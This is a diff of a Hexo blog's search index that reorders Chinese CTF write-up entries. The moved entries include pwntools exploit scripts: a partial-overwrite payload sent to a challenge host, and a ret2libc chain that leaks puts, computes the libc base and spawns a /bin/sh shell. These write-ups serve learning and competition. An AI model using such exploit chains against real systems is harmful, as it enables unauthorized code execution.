@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUU_Heap</title>
+    <url>/article/BUU_Heap/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>BUUCTF</title>
     <url>/article/BUUCTF/</url>
     <content><![CDATA[<p>记录一些奇奇怪怪的题目 or 搞不懂的操作</p>
@@ -61,14 +69,6 @@
 ]]></content>
       <categories>
         <category>WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>BUU_Heap</title>
-    <url>/article/BUU_Heap/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
       </categories>
   </entry>
   <entry>
@@ -176,6 +176,30 @@
       </categories>
   </entry>
   <entry>
+    <title>EIP</title>
+    <url>/article/EIP/</url>
+    <content><![CDATA[<h1 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h1><span id="more"></span>
+<h2 id="地址随机化"><a href="#地址随机化" class="headerlink" title="地址随机化"></a>地址随机化</h2><h3 id="NepCTF-给你一朵小红花"><a href="#NepCTF-给你一朵小红花" class="headerlink" title="NepCTF 给你一朵小红花"></a>NepCTF 给你一朵小红花</h3><p>2021.3.25</p>
+<p>找字符串看见cat flag的system函数，进去发现反编译是红色的，快捷键P手动让IDA生成一个函数</p>
+<p><img src="/article/EIP/20210325191702.png" alt="20210325191702"></p>
+<p><img src="/article/EIP/20210325191953.png" alt="20210325191953"></p>
+<p>只要程序返回到这个</p>
+<p><img src="/article/EIP/%7B9A808D7E-F8DA-C99D-776D-F86EB6839E53%7D.JPG" alt="{9A808D7E-F8DA-C99D-776D-F86EB6839E53}"></p>
+<p>也就是返回了序号5对应的字符<br>这个时候发送send不要line 下面的内容</p>
+<p><img src="/article/EIP/20210325192243.png" alt="20210325192243"></p>
+<p><code>p64(0) + p64(1) + b&quot;\xE1&quot;</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line"><span class="comment">#p = process(&#x27;./xhh&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">35402</span> )</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">b&quot;\xE1&quot;</span> </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>多跑几次就能出flag</p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>EIP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DASCTF_2021_3</title>
     <url>/article/DASCTF_2021_3/</url>
     <content><![CDATA[<p>DASCTF 2021三月赛</p>
@@ -199,30 +223,6 @@
       <categories>
         <category>比赛WriteUp</category>
       </categories>
-  </entry>
-  <entry>
-    <title>EIP</title>
-    <url>/article/EIP/</url>
-    <content><![CDATA[<h1 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h1><span id="more"></span>
-<h2 id="地址随机化"><a href="#地址随机化" class="headerlink" title="地址随机化"></a>地址随机化</h2><h3 id="NepCTF-给你一朵小红花"><a href="#NepCTF-给你一朵小红花" class="headerlink" title="NepCTF 给你一朵小红花"></a>NepCTF 给你一朵小红花</h3><p>2021.3.25</p>
-<p>找字符串看见cat flag的system函数，进去发现反编译是红色的，快捷键P手动让IDA生成一个函数</p>
-<p><img src="/article/EIP/20210325191702.png" alt="20210325191702"></p>
-<p><img src="/article/EIP/20210325191953.png" alt="20210325191953"></p>
-<p>只要程序返回到这个</p>
-<p><img src="/article/EIP/%7B9A808D7E-F8DA-C99D-776D-F86EB6839E53%7D.JPG" alt="{9A808D7E-F8DA-C99D-776D-F86EB6839E53}"></p>
-<p>也就是返回了序号5对应的字符<br>这个时候发送send不要line 下面的内容</p>
-<p><img src="/article/EIP/20210325192243.png" alt="20210325192243"></p>
-<p><code>p64(0) + p64(1) + b&quot;\xE1&quot;</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line"><span class="comment">#p = process(&#x27;./xhh&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">35402</span> )</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">b&quot;\xE1&quot;</span> </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
-
-<p>多跑几次就能出flag</p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>EIP</tag>
-      </tags>
   </entry>
   <entry>
     <title>Heap_Learn</title>
@@ -355,14 +355,6 @@
   <entry>
     <title>ISCC_2021</title>
     <url>/article/ISCC_2021/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ISCC_2021</title>
-    <url>/article/ISCC_2021/</url>
     <content><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span>
 
 <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
@@ -401,6 +393,14 @@
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ISCC_2021</title>
+    <url>/article/ISCC_2021/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
       </categories>
   </entry>
   <entry>
@@ -948,14 +948,6 @@
       </tags>
   </entry>
   <entry>
-    <title>code</title>
-    <url>/article/code/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CISCN_2019</title>
     <url>/article/CISCN_2019/</url>
     <content><![CDATA[<h1 id="ciscn-2019"><a href="#ciscn-2019" class="headerlink" title="ciscn_2019"></a>ciscn_2019</h1><span id="more"></span>
@@ -1012,6 +1004,14 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>code</title>
+    <url>/article/code/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
   </entry>
   <entry>
     <title>One_gadget</title>
@@ -1392,6 +1392,40 @@
       </categories>
   </entry>
   <entry>
+    <title>湖湘杯hxb_Pwn</title>
+    <url>/article/hxb_Pwn/</url>
+    <content><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span>
+<h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跟进if下面的函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p>
+<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure>
+
+
+<p>写exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
+<p>这就print出来了puts的地址</p>
+<p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p>
+<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
+<p>在套用一下公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span>		<span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<p>复习一下libc64_getshell公式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
     <title>湖湘杯hxb_Re</title>
     <url>/article/hxb_Re/</url>
     <content><![CDATA[<h1 id="湖湘杯hxb-Re"><a href="#湖湘杯hxb-Re" class="headerlink" title="湖湘杯hxb_Re"></a>湖湘杯hxb_Re</h1><span id="more"></span>
@@ -1428,40 +1462,6 @@
 <p>输出结果：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> +</span><br><span class="line"><span class="number">16</span> <span class="number">1</span></span><br><span class="line"><span class="number">13</span> <span class="number">3</span></span><br><span class="line"><span class="number">19</span> <span class="number">3</span></span><br><span class="line"><span class="number">24</span> <span class="number">5</span></span><br><span class="line"><span class="number">9</span> @</span><br><span class="line"><span class="number">5</span> M</span><br><span class="line"><span class="number">8</span> M</span><br><span class="line"><span class="number">18</span> R</span><br><span class="line"><span class="number">22</span> T</span><br><span class="line"><span class="number">14</span> X</span><br><span class="line"><span class="number">7</span> _</span><br><span class="line"><span class="number">12</span> _</span><br><span class="line"><span class="number">17</span> _</span><br><span class="line"><span class="number">21</span> _</span><br><span class="line"><span class="number">2</span> a</span><br><span class="line"><span class="number">23</span> e</span><br><span class="line"><span class="number">0</span> f</span><br><span class="line"><span class="number">3</span> g</span><br><span class="line"><span class="number">11</span> h</span><br><span class="line"><span class="number">1</span> l</span><br><span class="line"><span class="number">10</span> t</span><br><span class="line"><span class="number">25</span> t</span><br><span class="line"><span class="number">20</span> v</span><br><span class="line"><span class="number">6</span> y</span><br><span class="line"><span class="number">4</span> &#123;</span><br><span class="line"><span class="number">26</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>手动操作一下就ok</p>
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>湖湘杯hxb_Pwn</title>
-    <url>/article/hxb_Pwn/</url>
-    <content><![CDATA[<h1 id="湖湘杯hxb-pwn"><a href="#湖湘杯hxb-pwn" class="headerlink" title="湖湘杯hxb_pwn"></a>湖湘杯hxb_pwn</h1><span id="more"></span>
-<h2 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h2><h3 id="pwn-libc"><a href="#pwn-libc" class="headerlink" title="pwn_libc"></a>pwn_libc</h3><p>ida</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108200522719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>16次循环<br>下面if判断v12&lt;=0x20<br>所以写</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>跟进if下面的函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108200913518.png#pic_center" alt="在这里插入图片描述"></p>
-<p>这里变量的栈是空栈0h，所以offset只需要64bit程序的8个就行。<br>再然后a * a1，所以传参需要double 0x20，也就是0x40<br><code>ROPgadget --binary pwn_printf</code><br>找到pop_rdi_ret的地址<br>复习一下libc64_payload公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">64</span>位payload: payload = <span class="string">&quot;a&quot;</span>*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)</span><br></pre></td></tr></table></figure>
-
-
-<p>写exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	n.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
-
-<p>这就print出来了puts的地址</p>
-<p><img src="https://img-blog.csdnimg.cn/20201108201921266.png#pic_center" alt="在这里插入图片描述"></p>
-<p>到<a href="https://libc.blukat.me/">libc database search</a>查一下相关libc信息</p>
-<p>在套用一下公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span>    <span class="comment"># -libc_Offset的puts</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span>   <span class="comment"># +libc_Offset的system</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span>		<span class="comment"># +libc_Offset的bin/sh</span></span><br></pre></td></tr></table></figure>
-
-<p>复习一下libc64_getshell公式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getshell: <span class="string">&quot;a&quot;</span>*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br></pre></td></tr></table></figure>
-
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn_printf&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">	sh.sendline(<span class="string">&quot;32&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(<span class="number">0x40</span>) + p64(<span class="number">0x4007C6</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;You will find this game very interesting\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(sh.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x080a30</span> <span class="comment">#0x6f6a0</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x04f4e0</span> <span class="comment">#0x0453a0</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1b40fa</span> <span class="comment">#0x18ce17 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4007C6</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
